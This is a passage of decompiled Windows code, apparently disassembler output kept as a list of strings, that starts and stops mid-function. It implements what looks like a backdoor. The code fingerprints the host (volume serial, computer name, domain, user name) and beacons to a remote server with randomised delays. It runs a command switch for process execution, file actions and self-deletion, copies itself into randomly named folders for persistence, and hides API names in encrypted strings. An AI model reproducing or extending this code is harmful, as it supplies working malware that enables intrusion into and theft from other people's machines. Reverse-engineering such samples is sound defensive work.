    "          }",
    "          if ( v29 )",
    "          {",
    "            GetCurrentDirectoryW(0x104u, Buffer);",
    "            v21 = sub_627426C0(Buffer);",
    "            if ( v21 )",
    "            {",
    "              v22 = strlen(v21) + 1;",
    "              TotalBytesAvail = v22 + 2;",
    "              v23 = (char *)sub_62745B80((unsigned int)(v22 + 3));",
    "              v18 = v23;",
    "              if ( !v23 )",
    "              {",
    "                v14 = 0;",
    "                goto LABEL_17;",
    "              }",
    "              strcpy(v23, v21);",
    "              strcat(v18, \"\\r\\n\");",
    "              sub_62745BE0(v21);",
    "            }",
    "            else",
    "            {",
    "              TotalBytesAvail = 1;",
    "              v18 = (char *)sub_62745B80(2u);",
    "              if ( !v18 )",
    "              {",
    "                v14 = 0;",
    "                goto LABEL_17;",
    "              }",
    "            }",
    "          }",
    "          else",
    "          {",
    "            TotalBytesAvail = 20;",
    "            v14 = (char *)sub_62745B80(0x15u);",
    "            if ( !v14 )",
    "              goto LABEL_17;",
    "            v24 = (const char *)sub_62746B10(&unk_6274B5F5);",
    "            strcpy(v14, v24);",
    "            sub_62746C30(v24);",
    "            v18 = v14;",
    "          }",
    "LABEL_20:",
    "          v19 = sub_62742760((_PROCESS_INFORMATION *)v18);",
    "          v14 = (char *)v19;",
    "          if ( v19 )",
    "          {",
    "            v20 = sub_627425A0(v19);",
    "            v30 = v20;",
    "            if ( v20 )",
    "            {",
    "              v30 = 0;",
    "              if ( TotalBytesAvail )",
    "              {",
    "                v25 = sub_62745B80(2LL * TotalBytesAvail + 1026);",
    "                v26 = (_DWORD *)v25;",
    "                v30 = (char *)v25;",
    "                if ( v25 )",
    "                {",
    "                  *(_DWORD *)(v25 + 4) = *a1;",
    "                  *(_DWORD *)(v25 + 8) = a1[1];",
    "                  *(_DWORD *)(v25 + 12) = 2;",
    "                  *(_DWORD *)(v25 + 16) = 4;",
    "                  *(_DWORD *)(v25 + 20) = a2;",
    "                  v27 = (unsigned int)sub_62741530((_BYTE *)(v25 + 36), v20, strlen(v20));",
    "                  v26[6] = 36;",
    "                  v26[7] = v27;",
    "                  v28 = (v27 + 3) & 0xFFFFFFFC;",
    "                  TotalBytesAvail = v28 + 36;",
    "                  *v26 = sub_62741E70(v26 + 1, v28 + 32, 0);",
    "                  if ( a5 )",
    "                  {",
    "                    sub_62745FF0(v31, a4, strlen(a4));",
    "                    sub_62746060(v31, v30, v30, TotalBytesAvail);",
    "                  }",
    "                  *a6 = TotalBytesAvail;",
    "                }",
    "              }",
    "              sub_62745BE0(v20);",
    "            }",
    "            sub_62745BE0(v14);",
    "            v14 = v30;",
    "          }",
    "          sub_62745BE0(v18);",
    "LABEL_17:",
    "          TerminateProcess(ProcessInformation.hProcess, 0);",
    "          CloseHandle(ProcessInformation.hProcess);",
    "          CloseHandle(ProcessInformation.hThread);",
    "        }",
    "        sub_62745BE0(v12);",
    "        v12 = (wchar_t *)v14;",
    "      }",
    "      sub_62745BE0(v9);",
    "      v9 = v12;",
    "    }",
    "    CloseHandle(hWritePipe);",
    "    CloseHandle(hReadPipe);",
    "  }",
    "  return v9;",
    "}",
    "",
    "",
    "char *__fastcall sub_627444A0(",
    "        _DWORD *a1,",
    "        int a2,",
    "        int a3,",
    "        int a4,",
    "        __int64 a5,",
    "        __int64 a6,",
    "        __int64 a7,",
    "        int a8,",
    "        const char *a9,",
    "        int a10,",
    "        unsigned int *a11)",
    "{",
    "  int v14; // ecx",
    "  int v15; // r12d",
    "  char *v16; // rax",
    "  char *v17; // rbx",
    "  const char *v18; // rbp",
    "  unsigned __int64 v19; // kr08_8",
    "  int v20; // esi",
    "  unsigned int v21; // ebp",
    "  _BYTE v23[312]; // [rsp+30h] [rbp-138h] BYREF",
    "",
    "  v14 = 1;",
    "  if ( a2 != 7 )",
    "    v14 = (a2 != 8) + 2;",
    "  v15 = sub_62746DC0(v14, a7, a8, a4, a5, a6);",
    "  v16 = (char *)sub_62745B80(0x400u);",
    "  v17 = v16;",
    "  if ( v16 )",
    "  {",
    "    *((_DWORD *)v16 + 1) = *a1;",
    "    *((_DWORD *)v16 + 2) = a1[1];",
    "    *((_DWORD *)v16 + 3) = 2;",
    "    *((_DWORD *)v16 + 4) = a2;",
    "    *((_DWORD *)v16 + 5) = a3;",
    "    if ( v15 )",
    "      v18 = (const char *)sub_62746B10(&unk_6274B611);",
    "    else",
    "      v18 = (const char *)sub_62746B10(&unk_6274B61B);",
    "    v19 = strlen(v18) + 1;",
    "    strcpy(v17 + 32, v18);",
    "    sub_62746C30(v18);",
    "    *((_DWORD *)v17 + 6) = 32;",
    "    *((_DWORD *)v17 + 7) = v19;",
    "    v20 = (v19 - 1 + 4) & 0xFFFFFFFC;",
    "    v21 = v20 + 32;",
    "    *(_DWORD *)v17 = sub_62741E70(v17 + 4, (unsigned int)(v20 + 28), 0);",
    "    if ( a10 )",
    "    {",
    "      sub_62745FF0(v23, a9, strlen(a9));",
    "      sub_62746060(v23, v17, v17, v21);",
    "    }",
    "    *a11 = v21;",
    "  }",
    "  return v17;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744620(HMODULE hModule, __int64 a2, int a3)",
    "{",
    "  const WCHAR *v6; // rbx",
    "  HMODULE LibraryW; // rsi",
    "  const CHAR *v8; // rbx",
    "  FARPROC ProcAddress; // r14",
    "  const CHAR *v10; // rbx",
    "  FARPROC v11; // rsi",
    "  const WCHAR *v12; // rbx",
    "  HMODULE v13; // r12",
    "  const CHAR *v14; // rbx",
    "  FARPROC v15; // rbp",
    "  int v16; // eax",
    "  unsigned int v17; // ebx",
    "  const wchar_t *v19; // rbx",
    "  const wchar_t *v20; // rbx",
    "  __int64 v21; // rsi",
    "  const wchar_t *v22; // rbx",
    "  __int64 v23; // rbx",
    "  __int64 v24; // rdi",
    "  wchar_t v25[264]; // [rsp+30h] [rbp-678h] BYREF",
    "  wchar_t Destination[264]; // [rsp+240h] [rbp-468h] BYREF",
    "  WCHAR Filename[300]; // [rsp+450h] [rbp-258h] BYREF",
    "",
    "  v6 = (const WCHAR *)sub_62746BA0(&unk_6274B628);",
    "  LibraryW = LoadLibraryW(v6);",
    "  sub_62746C30(v6);",
    "  v8 = (const CHAR *)sub_62746B10(&unk_6274B649);",
    "  ProcAddress = GetProcAddress(LibraryW, v8);",
    "  sub_62746C30(v8);",
    "  v10 = (const CHAR *)sub_62746B10(&unk_6274B660);",
    "  v11 = GetProcAddress(LibraryW, v10);",
    "  sub_62746C30(v10);",
    "  v12 = (const WCHAR *)sub_62746BA0(&unk_6274B688);",
    "  v13 = LoadLibraryW(v12);",
    "  sub_62746C30(v12);",
    "  v14 = (const CHAR *)sub_62746B10(&unk_6274B6A7);",
    "  v15 = GetProcAddress(v13, v14);",
    "  sub_62746C30(v14);",
    "  ((void (__fastcall *)(__int64, wchar_t *, __int64))v11)(a2, Destination, 260);",
    "  v16 = ((__int64 (__fastcall *)(_QWORD, wchar_t *))v15)(0, Destination);",
    "  if ( !v16 || (v17 = 0, v16 == 183) )",
    "  {",
    "    v19 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "    wcscat(Destination, v19);",
    "    sub_62746C30(v19);",
    "    if ( (unsigned int)sub_62748410(hModule) )",
    "    {",
    "      v22 = (const wchar_t *)sub_62746BA0(&unk_6274B6D0);",
    "      wcscat(Destination, v22);",
    "      sub_62746C30(v22);",
    "      GetModuleFileNameW(hModule, Filename, 0x104u);",
    "      v17 = ((__int64 (__fastcall *)(WCHAR *, wchar_t *, _QWORD))ProcAddress)(Filename, Destination, 0);",
    "      if ( !v17 )",
    "        return v17;",
    "      v21 = sub_62746BA0(&unk_6274B70F);",
    "      v23 = sub_62746BA0(&unk_6274B71C);",
    "      sub_62742580(v25, 0x104u, L\"\\\"%ls\\\",%ls %ls\", Destination, v23, v21);",
    "      sub_62746C30(v23);",
    "      v24 = sub_62746BA0(&unk_6274B750);",
    "      v17 = sub_62747840(a3, v24, (unsigned int)v25, 60, 10);",
    "      sub_62746C30(v24);",
    "    }",
    "    else",
    "    {",
    "      v20 = (const wchar_t *)sub_62746BA0(&unk_6274B6F0);",
    "      wcscat(Destination, v20);",
    "      sub_62746C30(v20);",
    "      GetModuleFileNameW(hModule, Filename, 0x104u);",
    "      v17 = ((__int64 (__fastcall *)(WCHAR *, wchar_t *, _QWORD))ProcAddress)(Filename, Destination, 0);",
    "      if ( !v17 )",
    "        return v17;",
    "      v21 = sub_62746BA0(&unk_6274B70F);",
    "      v17 = sub_62747840(a3, (unsigned int)Destination, v21, 60, 10);",
    "    }",
    "    sub_62746C30(v21);",
    "  }",
    "  return v17;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744900(int a1, int a2)",
    "{",
    "  DWORD TickCount; // eax",
    "",
    "  TickCount = GetTickCount();",
    "  srand(TickCount);",
    "  return rand() % (unsigned int)(a2 - a1 + 1) + a1;",
    "}",
    "",
    "",
    "__int64 sub_62744940()",
    "{",
    "  int v0; // eax",
    "  __int64 v1; // r12",
    "  __int64 v2; // rdi",
    "  const char *v3; // rsi",
    "  const wchar_t *v4; // rbx",
    "  size_t v5; // rax",
    "  char *v7; // [rsp+28h] [rbp-30h] BYREF",
    "",
    "  v7 = 0;",
    "  v0 = sub_627475F0(&v7);",
    "  if ( v0 )",
    "  {",
    "    if ( v0 > 0 )",
    "    {",
    "      v1 = 8LL * (unsigned int)(v0 - 1) + 8;",
    "      v2 = 0;",
    "LABEL_4:",
    "      while ( 2 )",
    "      {",
    "        v3 = (const char *)&off_6274A270;",
    "        do",
    "        {",
    "          while ( 1 )",
    "          {",
    "            _mm_prefetch(v3, 1);",
    "            v4 = (const wchar_t *)sub_62746BA0(*((_QWORD *)v3 - 6));",
    "            v5 = wcslen(v4);",
    "            if ( !wcsncmp(*(const wchar_t **)&v7[v2], v4, v5) )",
    "              break;",
    "            sub_62746C30(v4);",
    "            v3 += 16;",
    "            if ( v3 == (const char *)&unk_6274A680 )",
    "            {",
    "              v2 += 8;",
    "              if ( v2 != v1 )",
    "                goto LABEL_4;",
    "              goto LABEL_8;",
    "            }",
    "          }",
    "          sub_62747BA0(*(_QWORD *)&v7[v2]);",
    "          sub_62746C30(v4);",
    "          v3 += 16;",
    "        }",
    "        while ( v3 != (const char *)&unk_6274A680 );",
    "        v2 += 8;",
    "        if ( v2 != v1 )",
    "          continue;",
    "        break;",
    "      }",
    "    }",
    "LABEL_8:",
    "    sub_62745BE0(v7);",
    "  }",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_62744A30()",
    "{",
    "  const WCHAR *v0; // rsi",
    "  HMODULE LibraryW; // rbx",
    "  const CHAR *v2; // rsi",
    "  FARPROC ProcAddress; // rdi",
    "  const CHAR *v4; // rsi",
    "  FARPROC v5; // r12",
    "  const CHAR *v6; // rsi",
    "  FARPROC v7; // rbp",
    "  __int64 v8; // rsi",
    "  WCHAR FileName[264]; // [rsp+20h] [rbp-458h] BYREF",
    "  WCHAR Filename[292]; // [rsp+230h] [rbp-248h] BYREF",
    "",
    "  v0 = (const WCHAR *)sub_62746BA0(&unk_6274B628);",
    "  LibraryW = LoadLibraryW(v0);",
    "  sub_62746C30(v0);",
    "  v2 = (const CHAR *)sub_62746B10(&unk_6274B771);",
    "  ProcAddress = GetProcAddress(LibraryW, v2);",
    "  sub_62746C30(v2);",
    "  v4 = (const CHAR *)sub_62746B10(&unk_6274B783);",
    "  v5 = GetProcAddress(LibraryW, v4);",
    "  sub_62746C30(v4);",
    "  v6 = (const CHAR *)sub_62746B10(&unk_6274B798);",
    "  v7 = GetProcAddress(LibraryW, v6);",
    "  sub_62746C30(v6);",
    "  sub_62744940();",
    "  GetModuleFileNameW(qword_627510B0, Filename, 0x104u);",
    "  ((void (__fastcall *)(__int64, WCHAR *))v5)(260, FileName);",
    "  v8 = sub_62746BA0(&unk_6274B7B1);",
    "  ((void (__fastcall *)(WCHAR *, __int64, _QWORD, WCHAR *))v7)(FileName, v8, 0, FileName);",
    "  sub_62746C30(v8);",
    "  DeleteFileW(FileName);",
    "  ((void (__fastcall *)(WCHAR *, WCHAR *))ProcAddress)(Filename, FileName);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62744B50(__int64 a1, const wchar_t *a2)",
    "{",
    "  const WCHAR *v3; // rsi",
    "  int v4; // eax",
    "  int v5; // eax",
    "  CHAR *v6; // rax",
    "  WCHAR *v7; // r14",
    "  int v8; // r15d",
    "  __int64 v9; // rbp",
    "  __int64 v10; // rsi",
    "  char *v11; // rbx",
    "  const WCHAR *v12; // rbx",
    "  HANDLE v13; // rax",
    "  __int16 TickCount; // ax",
    "  char *v16; // rdi",
    "  int v17; // ebp",
    "  int v18; // ebx",
    "  char *v19; // rax",
    "  char *v20; // rsi",
    "  char *v21; // rax",
    "  _DWORD *v22; // rax",
    "  void *v23; // rsi",
    "  char *v24; // rax",
    "  _DWORD *v25; // rax",
    "  void *v26; // rsi",
    "  char *v27; // rax",
    "  _DWORD *v28; // rax",
    "  void *v29; // rsi",
    "  char *v30; // rax",
    "  char *v31; // rax",
    "  char *v32; // rsi",
    "  char *v33; // rax",
    "  char *v34; // rsi",
    "  WCHAR *v35; // rax",
    "  char *v36; // rax",
    "  __int64 v37; // rsi",
    "  _DWORD *v38; // rax",
    "  void *v39; // rsi",
    "  char *v40; // rax",
    "  const char *v41; // [rsp+60h] [rbp-608h]",
    "  const WCHAR *v42; // [rsp+68h] [rbp-600h]",
    "  CHAR *v43; // [rsp+70h] [rbp-5F8h]",
    "  int v44; // [rsp+78h] [rbp-5F0h]",
    "  __int64 v45; // [rsp+80h] [rbp-5E8h]",
    "  __int64 v46; // [rsp+88h] [rbp-5E0h]",
    "  WCHAR *v47; // [rsp+90h] [rbp-5D8h]",
    "  __int64 v48; // [rsp+90h] [rbp-5D8h]",
    "  char *v49; // [rsp+98h] [rbp-5D0h]",
    "  _BYTE v50[272]; // [rsp+A0h] [rbp-5C8h] BYREF",
    "  int v51; // [rsp+1B0h] [rbp-4B8h] BYREF",
    "  __int64 v52; // [rsp+1B4h] [rbp-4B4h] BYREF",
    "  DWORD v53; // [rsp+1BCh] [rbp-4ACh] BYREF",
    "  WCHAR v54[262]; // [rsp+1C0h] [rbp-4A8h] BYREF",
    "  DWORD nSize; // [rsp+3CCh] [rbp-29Ch] BYREF",
    "  WCHAR Buffer[22]; // [rsp+3D0h] [rbp-298h] BYREF",
    "  DWORD v57; // [rsp+3FCh] [rbp-26Ch] BYREF",
    "  WCHAR v58[256]; // [rsp+400h] [rbp-268h] BYREF",
    "  _DWORD v59[4]; // [rsp+600h] [rbp-68h] BYREF",
    "  _DWORD v60[3]; // [rsp+610h] [rbp-58h] BYREF",
    "  DWORD VolumeSerialNumber[19]; // [rsp+61Ch] [rbp-4Ch] BYREF",
    "",
    "  VolumeSerialNumber[0] = 0;",
    "  v3 = (const WCHAR *)sub_62746BA0(&unk_6274B7C0);",
    "  GetVolumeInformationW(v3, 0, 0, VolumeSerialNumber, 0, 0, 0, 0);",
    "  sub_62746C30(v3);",
    "  GetModuleHandleW(0);",
    "  nSize = 16;",
    "  GetComputerNameW(Buffer, &nSize);",
    "  GetModuleHandleW(0);",
    "  v57 = 256;",
    "  v58[0] = 0;",
    "  GetComputerNameExW(ComputerNameDnsDomain, v58, &v57);",
    "  GetModuleHandleW(0);",
    "  v53 = 257;",
    "  GetUserNameW(v54, &v53);",
    "  GetModuleHandleW(0);",
    "  v4 = wcslen(a2);",
    "  v5 = sub_62741E70(a2, (unsigned int)(2 * v4), 0xFFFFFFFFLL);",
    "  v60[0] = VolumeSerialNumber[0] ^ v5;",
    "  LODWORD(v3) = sub_62741E70(Buffer, 2 * nSize, 0xFFFFFFFFLL);",
    "  v60[1] = sub_62741E70(v54, 2 * v53, 0xFFFFFFFFLL) ^ (unsigned int)v3;",
    "  sub_62745C10(v59);",
    "  v41 = (const char *)sub_62746B10(&unk_6274A0E0);",
    "  v42 = (const WCHAR *)sub_62746BA0(&unk_6274A020);",
    "  v6 = sub_62742960(v60, v59, v58, Buffer, v54, v42, a2, v41, 1, (unsigned int *)&v51);",
    "  v43 = v6;",
    "  if ( !v6 )",
    "    goto LABEL_12;",
    "  v7 = sub_627428E0(v6, v51);",
    "  if ( !v7 )",
    "    goto LABEL_11;",
    "  v8 = 0;",
    "  while ( 1 )",
    "  {",
    "    v9 = sub_62746BA0(&unk_6274A160);",
    "    v10 = sub_62746BA0(&unk_6274A120);",
    "    if ( dword_6274A000 )",
    "      v8 = 1;",
    "    v11 = sub_62741F30(v9, v10, word_6274A004, 1, (__int64)&unk_6274B7D0, v7, 0, 0, (_DWORD *)&v52 + 1, v8);",
    "    if ( v11 )",
    "    {",
    "      if ( HIDWORD(v52) > 4 )",
    "        break;",
    "    }",
    "    sub_62746C30(v10);",
    "    sub_62746C30(v9);",
    "    v12 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "    v13 = OpenMutexW(0x100000u, 0, v12);",
    "    if ( v13 )",
    "      goto LABEL_9;",
    "    sub_62746C30(v12);",
    "LABEL_14:",
    "    GetModuleHandleW(0);",
    "    TickCount = GetTickCount();",
    "    Sleep((TickCount & 0xFFF) + 15000);",
    "  }",
    "  sub_62745FF0(v50, v41, strlen(v41));",
    "  sub_62746060(v50, v11, v11, HIDWORD(v52));",
    "  v44 = 0;",
    "  if ( (unsigned int)sub_62741E70(v11 + 4, (unsigned int)(HIDWORD(v52) - 4), 0) == *(_DWORD *)v11 )",
    "  {",
    "    v16 = v11 + 8;",
    "    if ( *((_DWORD *)v11 + 1) )",
    "    {",
    "      v45 = v9;",
    "      v46 = v10;",
    "      v49 = v11;",
    "      v17 = *((_DWORD *)v11 + 1);",
    "      v18 = 0;",
    "      do",
    "      {",
    "        switch ( *(_DWORD *)v16 )",
    "        {",
    "          case 1:",
    "            v28 = sub_62742CD0(v60, *((_DWORD *)v16 + 1), v41, 1, (DWORD *)&v51);",
    "            v29 = v28;",
    "            if ( v28 )",
    "            {",
    "              v30 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v28, v51, &v52, v8);",
    "              if ( v30 )",
    "                sub_62745BE0(v30);",
    "              sub_62745BE0(v29);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 2:",
    "            v38 = sub_62743070(v60, *((_DWORD *)v16 + 1), v41, 1, &v51);",
    "            v39 = v38;",
    "            if ( v38 )",
    "            {",
    "              v40 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v38, v51, &v52, v8);",
    "              if ( v40 )",
    "                sub_62745BE0(v40);",
    "              sub_62745BE0(v39);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 3:",
    "            v31 = sub_62743670(v60, *((_DWORD *)v16 + 1), v41, 1, &v51);",
    "            v32 = v31;",
    "            if ( v31 )",
    "            {",
    "              v33 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v31, v51, &v52, v8);",
    "              if ( v33 )",
    "                sub_62745BE0(v33);",
    "              sub_62745BE0(v32);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 4:",
    "            v34 = v16 + 16;",
    "            v35 = sub_62743EA0(v60, *((_DWORD *)v16 + 1), (_PROCESS_INFORMATION *)(v16 + 16), v41, 1, (DWORD *)&v51);",
    "            v47 = v35;",
    "            v16 += 16;",
    "            if ( v35 )",
    "            {",
    "              v36 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v35, v51, &v52, v8);",
    "              if ( v36 )",
    "                sub_62745BE0(v36);",
    "              sub_62745BE0(v47);",
    "              v16 = v34;",
    "            }",
    "            break;",
    "          case 5:",
    "            v25 = sub_62743890(",
    "                    v60,",
    "                    *((_DWORD *)v16 + 1),",
    "                    (__int64)(v16 + 24),",
    "                    &v16[*((unsigned int *)v16 + 4) - 8],",
    "                    *((_DWORD *)v16 + 5),",
    "                    v41,",
    "                    1,",
    "                    (unsigned int *)&v51);",
    "            v26 = v25;",
    "            if ( v25 )",
    "            {",
    "              v27 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v25, v51, &v52, v8);",
    "              if ( v27 )",
    "                sub_62745BE0(v27);",
    "              sub_62745BE0(v26);",
    "            }",
    "            v16 += 16;",
    "            break;",
    "          case 6:",
    "            v22 = sub_62743B20(v60, *((_DWORD *)v16 + 1), (__int64)(v16 + 16), v41, 1, (unsigned int *)&v51);",
    "            v23 = v22;",
    "            if ( v22 )",
    "            {",
    "              v24 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v22, v51, &v52, v8);",
    "              if ( v24 )",
    "                sub_62745BE0(v24);",
    "              sub_62745BE0(v23);",
    "            }",
    "            v16 += 8;",
    "            break;",
    "          case 7:",
    "          case 8:",
    "            v19 = sub_627444A0(",
    "                    v60,",
    "                    *(_DWORD *)v16,",
    "                    *((_DWORD *)v16 + 1),",
    "                    (int)v16 + *((_DWORD *)v16 + 2) - 8,",
    "                    (__int64)&v16[*((unsigned int *)v16 + 4) - 8],",
    "                    (__int64)&v16[*((unsigned int *)v16 + 6) - 8],",
    "                    (__int64)&v16[*((unsigned int *)v16 + 8) - 8],",
    "                    *((_DWORD *)v16 + 9),",
    "                    v41,",
    "                    1,",
    "                    (unsigned int *)&v51);",
    "            v20 = v19;",
    "            if ( v19 )",
    "            {",
    "              v21 = sub_62741F30(v45, v46, word_6274A004, 2, (__int64)&unk_6274B7D0, v7, (__int64)v19, v51, &v52, v8);",
    "              if ( v21 )",
    "                sub_62745BE0(v21);",
    "              sub_62745BE0(v20);",
    "            }",
    "            v16 += 16;",
    "            break;",
    "          case 0xA:",
    "            v48 = sub_62746B10(&unk_6274B7D4);",
    "            v37 = sub_62746B10(&unk_6274B7E2);",
    "            sub_62746DC0(",
    "              2,",
    "              (_DWORD)v16 + *((_DWORD *)v16 + 2) - 8,",
    "              *((_DWORD *)v16 + 3),",
    "              (unsigned int)&unk_6274B7F2,",
    "              v48,",
    "              v37);",
    "            sub_62746C30(v48);",
    "            sub_62746C30(v37);",
    "            v16 += 8;",
    "            break;",
    "          case 0xB:",
    "            sub_62744A30();",
    "            v16 += 8;",
    "            v44 = 1;",
    "            break;",
    "          default:",
    "            break;",
    "        }",
    "        ++v18;",
    "      }",
    "      while ( v17 != v18 );",
    "      v9 = v45;",
    "      v10 = v46;",
    "      v11 = v49;",
    "    }",
    "    else",
    "    {",
    "      v44 = 0;",
    "    }",
    "  }",
    "  sub_62745BE0(v11);",
    "  sub_62746C30(v10);",
    "  sub_62746C30(v9);",
    "  v12 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "  v13 = OpenMutexW(0x100000u, 0, v12);",
    "  if ( !v13 )",
    "  {",
    "    sub_62746C30(v12);",
    "    if ( v44 )",
    "      goto LABEL_10;",
    "    goto LABEL_14;",
    "  }",
    "LABEL_9:",
    "  CloseHandle(v13);",
    "  sub_62746C30(v12);",
    "LABEL_10:",
    "  sub_62745BE0(v7);",
    "LABEL_11:",
    "  sub_62745BE0(v43);",
    "LABEL_12:",
    "  sub_62746C30(v42);",
    "  return sub_62746C30(v41);",
    "}",
    "",
    "",
    "__int64 sub_62745590()",
    "{",
    "  OLECHAR *v0; // rbx",
    "  OLECHAR *v1; // rbx",
    "",
    "  v0 = (OLECHAR *)sub_62746BA0(off_6274A650);",
    "  sub_62747CC0(v0);",
    "  sub_62746C30(v0);",
    "  v1 = (OLECHAR *)sub_62746BA0(off_6274A658);",
    "  sub_62747CC0(v1);",
    "  sub_62746C30(v1);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 sub_627455E0()",
    "{",
    "  const wchar_t *v0; // rsi",
    "  const char *v1; // rdi",
    "  const wchar_t *v2; // rbp",
    "  __int64 v4; // [rsp+28h] [rbp-CD0h]",
    "  wchar_t *Source; // [rsp+30h] [rbp-CC8h]",
    "  wchar_t *v6; // [rsp+38h] [rbp-CC0h]",
    "  wchar_t *v7; // [rsp+40h] [rbp-CB8h]",
    "  wchar_t *v8; // [rsp+48h] [rbp-CB0h]",
    "  wchar_t v9[264]; // [rsp+50h] [rbp-CA8h] BYREF",
    "  wchar_t FileName[264]; // [rsp+260h] [rbp-A98h] BYREF",
    "  wchar_t PathName[264]; // [rsp+470h] [rbp-888h] BYREF",
    "  wchar_t Dst[264]; // [rsp+680h] [rbp-678h] BYREF",
    "  wchar_t Src[264]; // [rsp+890h] [rbp-468h] BYREF",
    "  wchar_t Destination[300]; // [rsp+AA0h] [rbp-258h] BYREF",
    "",
    "  sub_62744940();",
    "  Source = (wchar_t *)sub_62746BA0(&unk_6274B880);",
    "  v6 = (wchar_t *)sub_62746BA0(&unk_6274B8AB);",
    "  v0 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "  v7 = (wchar_t *)sub_62746BA0(&unk_6274B6F0);",
    "  v8 = (wchar_t *)sub_62746BA0(&unk_6274B6D0);",
    "  v1 = (const char *)&off_6274A258;",
    "  do",
    "  {",
    "    while ( 1 )",
    "    {",
    "      v2 = (const wchar_t *)sub_62746BA0(*((_QWORD *)v1 - 3));",
    "      _mm_prefetch(v1, 1);",
    "      v4 = sub_62746BA0(*((_QWORD *)v1 - 2));",
    "      wcscpy(Destination, Source);",
    "      wcscat(Destination, v0);",
    "      wcscat(Destination, v2);",
    "      wcscpy(Src, v6);",
    "      wcscat(Src, v0);",
    "      wcscat(Src, v2);",
    "      ExpandEnvironmentStringsW(Destination, Dst, 0x104u);",
    "      ExpandEnvironmentStringsW(Src, PathName, 0x104u);",
    "      wcscpy(FileName, Dst);",
    "      wcscat(FileName, v0);",
    "      wcscat(FileName, v7);",
    "      wcscpy(v9, PathName);",
    "      wcscat(v9, v0);",
    "      wcscat(v9, v7);",
    "      if ( GetFileAttributesW(FileName) != -1 )",
    "        DeleteFileW(FileName);",
    "      if ( GetFileAttributesW(v9) != -1 )",
    "        DeleteFileW(v9);",
    "      wcscpy(FileName, Dst);",
    "      wcscat(FileName, v0);",
    "      wcscat(FileName, v8);",
    "      wcscpy(v9, PathName);",
    "      wcscat(v9, v0);",
    "      wcscat(v9, v8);",
    "      if ( GetFileAttributesW(FileName) != -1 )",
    "        DeleteFileW(FileName);",
    "      if ( GetFileAttributesW(v9) == -1 )",
    "        break;",
    "      DeleteFileW(v9);",
    "      RemoveDirectoryW(Dst);",
    "      RemoveDirectoryW(PathName);",
    "      sub_62746C30(v4);",
    "      sub_62746C30(v2);",
    "      v1 += 16;",
    "      if ( v1 == (const char *)&unk_6274A668 )",
    "        goto LABEL_10;",
    "    }",
    "    RemoveDirectoryW(Dst);",
    "    RemoveDirectoryW(PathName);",
    "    sub_62746C30(v4);",
    "    sub_62746C30(v2);",
    "    v1 += 16;",
    "  }",
    "  while ( v1 != (const char *)&unk_6274A668 );",
    "LABEL_10:",
    "  sub_62746C30(v8);",
    "  sub_62746C30(v7);",
    "  sub_62746C30(v0);",
    "  sub_62746C30(v6);",
    "  sub_62746C30(Source);",
    "  return 0;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_627458E0(HMODULE a1)",
    "{",
    "  const WCHAR *v2; // rbx",
    "  HANDLE MutexW; // rsi",
    "  _UNKNOWN **v4; // rsi",
    "  const wchar_t *v5; // rbx",
    "  __int64 v6; // rdi",
    "  const wchar_t *v7; // r13",
    "  const wchar_t *v8; // r12",
    "  unsigned int v9; // esi",
    "  const wchar_t *v11; // r14",
    "  wchar_t Destination[292]; // [rsp+20h] [rbp-248h] BYREF",
    "",
    "  v2 = (const WCHAR *)sub_62746BA0(&unk_6274B7F8);",
    "  MutexW = CreateMutexW(0, 0, v2);",
    "  if ( MutexW )",
    "  {",
    "    Sleep(0x2710u);",
    "    CloseHandle(MutexW);",
    "  }",
    "  sub_62746C30(v2);",
    "  sub_627455E0();",
    "  sub_62745590();",
    "  Sleep(0x3E8u);",
    "  v4 = &off_6274A240 + 2 * (int)sub_62744900(0, 64);",
    "  v5 = (const wchar_t *)sub_62746BA0(*v4);",
    "  v6 = sub_62746BA0(v4[1]);",
    "  v7 = (const wchar_t *)sub_62746BA0(&unk_6274B880);",
    "  v8 = (const wchar_t *)sub_62746BA0(&unk_6274B6C1);",
    "  wcscpy(Destination, v7);",
    "  wcscat(Destination, v8);",
    "  wcscat(Destination, v5);",
    "  v9 = sub_62744620(a1, (__int64)Destination, (int)v5);",
    "  if ( !v9 )",
    "  {",
    "    v11 = (const wchar_t *)sub_62746BA0(&unk_6274B8AB);",
    "    wcscpy(Destination, v11);",
    "    wcscat(Destination, v8);",
    "    wcscat(Destination, v5);",
    "    v9 = sub_62744620(a1, (__int64)Destination, (int)v5);",
    "    sub_62746C30(v11);",
    "  }",
    "  sub_62746C30(v8);",
    "  sub_62746C30(v7);",
    "  sub_62746C30(v6);",
    "  sub_62746C30(v5);",
    "  return v9;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745A70(HMODULE a1, const wchar_t *a2)",
    "{",
    "  __int64 result; // rax",
    "",
    "  if ( (unsigned int)sub_627483E0() )",
    "    return sub_62744B50((__int64)a1, a2);",
    "  result = sub_627458E0(a1);",
    "  if ( !(_DWORD)result )",
    "    return sub_62744B50((__int64)a1, a2);",
    "  return result;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_62745AC0(HMODULE a1)",
    "{",
    "  const WCHAR *v2; // rbx",
    "  HANDLE MutexW; // rsi",
    "  WCHAR *v5; // rbp",
    "",
    "  qword_627510B0 = a1;",
    "  v2 = (const WCHAR *)sub_62746BA0(&unk_6274A080);",
    "  SetLastError(0);",
    "  MutexW = CreateMutexW(0, 0, v2);",
